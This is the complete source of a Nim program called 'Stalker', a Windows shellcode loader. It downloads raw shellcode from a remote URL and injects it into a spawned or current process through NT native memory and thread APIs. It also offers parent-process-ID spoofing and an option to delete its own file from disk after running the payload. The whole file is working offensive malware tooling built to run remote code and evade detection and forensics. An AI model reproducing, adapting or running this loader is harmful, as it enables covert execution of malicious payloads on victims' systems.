import winim/[lean, winstr, utils]
import std/[strformat, strutils]
import std/[asyncdispatch, httpclient]
import os

proc getErrorMessage(errCode: DWORD): string =
    var pBuffer = newWString(512)
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL,
                   errCode,
                   cast[DWORD](MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)),
                   pBuffer,
                   cast[DWORD](pBuffer.len),
                   NULL);
    nullTerminate(pBuffer)
    var errMsg = %$pBuffer
    return strip(errMsg)

proc panic(msg: string, get_err = true) =
    if get_err:
        var errCode = GetLastError()
        var errMsg = getErrorMessage(errCode)
        echo(fmt"[!] {msg}: (Err: {errCode}) {errMsg}")
    else:
        echo(fmt"[!] {msg}")
    quit(QuitFailure)


proc panic(msg: string, nt_status_code: NTSTATUS) =
    var errCode = RtlNtStatusToDosError(nt_status_code)
    var errMsg = getErrorMessage(errCode)
    echo(fmt"[!] {msg}: (Err: {errCode}) {errMsg}")
    quit(QuitFailure)

proc open_handle(pwPath: PWCHAR): HANDLE =
    var handle = CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    if handle == INVALID_HANDLE_VALUE:
        panic("CreateFileW")
    return handle

proc rename_handle(handle: HANDLE) =
    var lpwStream = newWideCString(":void")
    var stream_len = cast[DWORD]((lpwStream.len)*2)
    var rename_size = cast[DWORD](sizeof(FILE_RENAME_INFO) + stream_len)
    var byte_seq: seq[byte]
    newSeq(byte_seq, rename_size)
    var rename_info: PFILE_RENAME_INFO = cast[PFILE_RENAME_INFO](addr byte_seq[0])
    RtlSecureZeroMemory(rename_info, rename_size)

    rename_info.FileNameLength = stream_len
    RtlCopyMemory(addr rename_info.FileName, addr lpwStream[0], stream_len)

    var ret = SetFileInformationByHandle(handle, fileRenameInfo, rename_info, rename_size)
    if ret == 0 :
        panic("[rename_handle] SetFileInformationByHandle")

proc disposition_handle(handle: HANDLE) =
    var disposition_info: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr disposition_info, sizeof(disposition_info))
    disposition_info.DeleteFile = TRUE
    var ret = SetFileInformationByHandle(handle, fileDispositionInfo, addr disposition_info, cast[DWORD](sizeof(disposition_info)))
    if ret == 0 :
        panic("[disposition_handle] SetFileInformationByHandle")


proc selfDelete() =
    var
        filename: array[MAX_PATH+1, WCHAR]
        hCurrentFile: HANDLE
    RtlSecureZeroMemory(addr filename[0], sizeof(filename))
    if GetModuleFileNameW(0, addr filename[0], MAX_PATH) == 0:
        panic("GetModuleFileNameW")

    hCurrentFile = open_handle(addr filename[0])
    echo("[+] Attempting file renaming")
    rename_handle(hCurrentFile)
    echo("    Successfully rename file")
    CloseHandle(hCurrentFile)
    
    hCurrentFile = open_handle(addr filename[0])
    echo("[+] Setting up delete disposition info")
    disposition_handle(hCurrentFile)
    CloseHandle(hCurrentFile)

    if not fileExists(%$filename):
        echo("[+] File deleted successfully")
    else:
        echo("[!] Fail to self delete")

proc sCreateProcess(target: string, pi: LPPROCESS_INFORMATION, si: LPSTARTUPINFOW | LPSTARTUPINFOEXW, creationFlags: DWORD = 0) =
    let ret = CreateProcessW(NULL,
                            newWideCString(target),
                            NULL,
                            NULL,
                            false,
                            creationFlags,
                            NULL,
                            NULL,
                            cast[LPSTARTUPINFOW](si),
                            pi)
    if ret == 0:
        panic("CreateProcessW")


proc sSpawnProcess(target: string, parent: int, pi: LPPROCESS_INFORMATION) = 
    if parent > 0:
        var si: STARTUPINFOEXW
        ZeroMemory(addr si, sizeof(STARTUPINFOEXW))
        var attributeSize: SIZE_T
        var hParent = OpenProcess(MAXIMUM_ALLOWED, false, cast[DWORD](parent))
        defer: CloseHandle(hParent)
        if hParent == 0:
            panic("OpenProcess")

        var ret: WINBOOL
        InitializeProcThreadAttributeList(NULL, 1, 0, addr attributeSize)
        var lpAttributeList = newSeq[byte](attributeSize)
        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr lpAttributeList[0])
        ret = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)
        if ret == 0:
            panic("InitializeProcThreadAttributeList")
        ret = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)
        if ret == 0:
            panic("UpdateProcThreadAttribute")
        si.StartupInfo.cb = cast[DWORD](sizeof(STARTUPINFOEXW))
        sCreateProcess(target, pi, addr si, EXTENDED_STARTUPINFO_PRESENT)
    else:
        var si: STARTUPINFO
        sCreateProcess(target, pi, &si)

proc display(url, target: string, parent: int, kill: bool) =
    echo(fmt"[*] Payload: {url}")
    if target == "":
        echo(fmt"[*] Target: Self-injection")
    else:
        echo(fmt"[*] Target: {target}")
    echo(fmt"[*] PPID Spoofing: {parent}")
    echo(fmt"[*] Kill: {kill}")
    echo()

proc fetch(url: string): Future[string] {.async.} = 
    var client = newAsyncHttpClient()
    try:
        await client.getContent(url)
    except Exception:
        panic(fmt"Unable to fetch {url}: {getCurrentExceptionMsg()}", get_err = false)
        return ""
    finally:
        client.close()

type
    USER_THREAD_START_ROUTINE = object
      ThreadParameter: PVOID
    PUSER_THREAD_START_ROUTINE = ptr USER_THREAD_START_ROUTINE

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: LPVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS 
  {.discardable, stdcall, dynlib: "ntdll", importc.}

proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: ULONG, NumberOfBytesWritten: PULONG): NTSTATUS
  {.discardable, stdcall, dynlib: "ntdll", importc.}

proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: LPVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS
  {.discardable, stdcall, dynlib: "ntdll", importc.}

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PUSER_THREAD_START_ROUTINE, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PVOID): NTSTATUS
  {.discardable, stdcall, dynlib: "ntdll", importc.}

proc NtWaitForSingleObject(Handle: HANDLE, Alertable: BOOLEAN, Timeout: PLARGE_INTEGER): NTSTATUS
  {.discardable, stdcall, dynlib: "ntdll", importc.}


proc stalker(url: string, target = "", parent = 0, kill = false) =
    echo("""
     j                       k
    .K                       Z.
    jM.                     .Mk
    WMk                     jMW
    YMM.       ,,,,,,      .MMY
    `MML;:''```      ```':;JMM'
    /`JMMMk.           .jMMMk'\
    / `GMMMI'         `IMMMO' \
   /    ~~~'           `~~~    \
   /                           \
   |                           |
   |      ;,           ,;      |
   |      Tk           jT      |
    |     `Mk   . .   jM'     |
    |      YK.   Y   .ZY      |
     \     `Kk   |   jZ'     /
     \       `'  |  `'       /
      \          |          /
       \         |         /
       \         |         /
        \        |        /
         \       |       /
         \       |       /
          \      |      /
           \     |     /
           \  |  |  |  /
            \ {| | |} /
             \ ` | ' /
              \  |  /
              \  |  /
               \   /
                \ /
                 ~   Stalker
    """)
    display(url, target, parent, kill)
    echo("[+] Fetching payload asynchronously")
    var futSc = fetch(url)

    var hTarget: HANDLE
    if target != "":
        echo("[+] CreateProcessW")
        var pi: PROCESS_INFORMATION
        sSpawnProcess(target, parent, addr pi)
        echo(fmt"    PID: {pi.dwProcessId}")
        hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, pi.dwProcessId)
    else:
        hTarget = GetCurrentProcess()
    defer:
        echo("[+] Closing target process handle")
        CloseHandle(hTarget)

    echo("[+] Waiting for payload to finsih downloading")
    var sc = waitFor futSc
    echo("    Done")

    echo("[+] NtAllocateVirtualMemory")
    var baseAddress: ULONG_PTR
    var regionSize: SIZE_T = sc.len
    var ret: NTSTATUS
    ret = NtAllocateVirtualMemory(hTarget, addr baseAddress, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if ret != STATUS_SUCCESS:
        panic("NtAllocateVirtualMemory", ret)
    echo(fmt"    Address: {baseAddress.toHex}")

    echo("[+] NtWriteVirtualMemory")
    var nb: ULONG
    ret = NtWriteVirtualMemory(hTarget, cast[PVOID](baseAddress), addr sc[0], cast[ULONG](sc.len), addr nb)
    if ret != STATUS_SUCCESS:
        panic("NtWriteVirtualMemory", ret)
    echo(fmt"    Shellcode injected")

    echo("[+] NtProtectVirtualMemory")
    var oldProtection: ULONG
    ret = NtProtectVirtualMemory(hTarget, addr baseAddress, addr nb, PAGE_EXECUTE_READ, addr oldProtection)
    if ret != STATUS_SUCCESS:
        panic("NtProtectVirtualMemory", ret)
    echo(fmt"    Shellcode marked as executable")

    echo("[+] NtCreateThreadEx")
    var hThread: HANDLE
    ret = NtCreateThreadEx(addr hThread,
                           THREAD_ALL_ACCESS,
                           NULL,
                           hTarget,
                           cast[PUSER_THREAD_START_ROUTINE](baseAddress),
                           NULL,
                           0,
                           0,
                           0,
                           0,
                           NULL)
    if ret != STATUS_SUCCESS:
        panic("NtCreateThreadEx", ret)

    defer:
        echo("[+] Closing thread handle")
        CloseHandle(hThread)
    echo("    Executing shellcode")

    if kill:
        selfDelete()

    if target == "":
        echo("[+] NtWaitForSingleObject")
        echo("    Keeping process alive")
        NtWaitForSingleObject(hThread, BOOLEAN(0), NULL)


when isMainModule:
    import cligen; dispatch stalker, help={
        "url": "Remote URL address for raw shellcode.",
        "target": "Specify the target/victim process. Default: Self-injection",
        "parent": "Spoof victim process under a Parent Process ID (This option is ignored for self-injection)",
        "kill": "Enable self-destruct to auto wipe file from disk.",
        "help": "Display help screen manual",
    }
